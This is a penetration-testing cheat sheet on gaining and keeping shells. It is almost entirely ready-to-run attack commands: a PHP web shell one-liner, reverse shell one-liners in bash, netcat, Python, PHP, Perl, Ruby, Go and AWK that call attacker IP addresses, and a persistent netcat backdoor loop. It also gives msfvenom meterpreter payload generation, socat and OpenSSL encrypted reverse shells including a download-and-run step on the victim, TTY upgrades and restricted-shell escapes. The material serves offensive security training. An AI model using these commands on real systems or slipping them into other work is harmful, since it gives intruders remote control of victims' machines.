# Shells 
## Contents
- [Shells](#shells)
  * [Contents](#contents)
  * [Web shells](#web-shells)
  * [Debugging Shells](#debugging-shells)
  * [Reverse shell commands](#reverse-shell-commands)
    + [Bash](#bash)
    + [netcat](#netcat)
    + [other languages](#other-languages)
  * [Msfvenom Payloads](#msfvenom-payloads)
  * [Upgrading to a pseudo terminal / TTY](#upgrading-to-a-pseudo-terminal---tty)

## Web shells 
[phpbash web shell](https://github.com/Arrexel/phpbash)  
[pentest monkey php shell](https://github.com/pentestmonkey/php-reverse-shell)  
[p0wney web shell](https://github.com/flozz/p0wny-shell)  
[white winter wolf web shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)  
[collection of PHP webshells](https://github.com/JohnTroony/php-webshells/tree/master/Collection)    
/usr/share/seclists/Web-Shells    

    <?php if(isset($_GET[0])){echo $_GE[0]($_GET[1]) } ? >     

## Debugging Shells   
executing a command and no response - maybe the command is redirecting to stderr not stdout?
2>&1
Check for versions / path variables  
No path variable? Need absolute path 

    /bin/bash -c 'id'   

## Reverse shell commands  
### Bash     
requires /dev/tcp support, primarily found in RedHat/Debian distros:          
One bash version (compromised account's shell must be bash; does not work via www-data):  

    bash -i >& /dev/tcp/10.6.85.85/4444 0>&1           
Two bash version (safer, since parent shell can be anything):    

    bash -c 'bash -i >& /dev/tcp/172.17.0.2/1337 0>&1'      
Don't forget to check with other shells : sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh         
Bash UDP    

    sh -i >& /dev/udp/10.0.0.1/4444 0>&1     
    nc -u -lvp 4444    #listener        
### netcat  
nc w/ -e (traditional):  

    rlwrap nc -e /bin/sh 172.16.5.1 4242   
    
    -e /bin/sh 
    -e /bin/bash
    -e /bin/zsh
    -e /bin/ash
    
nc openbsd (no -e):    

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.6.85.85 53 >/tmp/f    
    
Persistent netcat backdoor using a while loop or nohup:  

    while [1 ]; do echo "Started"; nc -l -p 443 -e /bin/sh; done     #goes away if user logs out, make persistent using nohup     
    no hup ./listener.sh &    #listener.sh: above line. Make a process keep running, ignores logout signal 
    
### other languages  
Python: 

    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")' 
    
Python ipv6:

    python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'     
  
PHP            
    
    php -r '$sock=fsockopen("10.6.85.85",4444);exec("/bin/sh -i <&3 >&3 2>&3");'     
    php -r '$sock=fsockopen("10.0.0.1",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
    php -r '$sock=fsockopen("10.0.0.1",4444);`/bin/sh -i <&3 >&3 2>&3`;'
    php -r '$sock=fsockopen("10.0.0.1",4444);system("/bin/sh -i <&3 >&3 2>&3");'
    php -r '$sock=fsockopen("10.0.0.1",4444);passthru("/bin/sh -i <&3 >&3 2>&3");'
    php -r '$sock=fsockopen("10.0.0.1",4444);popen("/bin/sh -i <&3 >&3 2>&3", "r");'


Perl 

    perl -e 'use Socket;$i="IP ADDRESS";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
Ruby 

    ruby -rsocket -e'f=TCPSocket.open("IP ADDRESS",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'    
    ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'     
    ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4444");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'       
    
    
Golang 

    echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","IP ADDRESS:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

AWK

    awk 'BEGIN {s = "/inet/tcp/0/IP ADDRESS/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
    
[Tiberius Reverse Shells](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/reverse-shells.rst) 

[Payload All the Things Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) 

[Reverse Shell Cheatsheet](https://github.com/d4t4s3c/Reverse-Shell-Cheat-Sheet)  

[Reverse and Bind Shells with Socat](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)

## Msfvenom Payloads 
[Reference](https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/)    

    msfvenom -l payloads      #list payloads    
    msfvenom -l encoders      #list encoders 
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf	
    msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	
    msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf	
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
   
PHP   

    msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
    cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php   
    target $ php shell.php    
Python    

    msfvenom -p python/meterpreter/reverse_tcp LHOST=10.10.16.192 LPORT=4444 -f raw     
    target$ python3 
    target$ [paste payload]      
### Socat        
[Socat Linux x64 Static Binary](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)                      

    attacker $ socat file:`tty`,raw,echo=0 TCP-L:4444                     
    victim $ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:4444           

    user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4444               
### OpenSSL 

    attackerk$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes      
    attacker$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
    #or
    attacker$ ncat --ssl -vv -l -p 4242

    victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4444 > /tmp/s; rm /tmp/s 

## Upgrading to a pseudo terminal / TTY     
[Reference](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)  
[What Happens in a Shell Upgrade?](https://www.youtube.com/watch?v=DqE6DxqJg8Q)       

    python -c 'import pty;pty.spawn("/bin/bash")' 
    echo os.system('/bin/bash')
    /bin/sh -i  
    script /dev/null -c bash      #create new pty owned by current user, fixed in newer versions of screen        
    
    SHELL=/bin/bash script -q /dev/null        Ctrl-Z        stty raw -echo        fg    reset    xterm
    
    Can you upload a [socat static binary](https://github.com/andrew-d/static-binaries)? 
    
    vi -> :sh or :!UNIX_command
    perl —e 'exec "/bin/sh";' 
    perl: exec "/bin/sh"; 
    ruby: exec "/bin/sh" 
    lua: os.execute('/bin/sh') 
    
## Restricted Shell Escapes        
Check [GTFOBins](https://gtfobins.github.io/), [HackTricks - Escaping from Jails](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash)                    
Try commands like: ls, cd, pwd, echo        
To to identify restricted shell type / software       
Try:    

    $(whoami) 
    ${whoami}   
Vim Escapes    

    :!/bin/sh
    :shell
    :set shell=/bin/sh  
Pagers 

    !/bin/sh
    !/bin/bash
    !bash 
SSH    

    ssh user@IP -t "bash --noprofile"
    ssh user@IP -t "/bin/sh"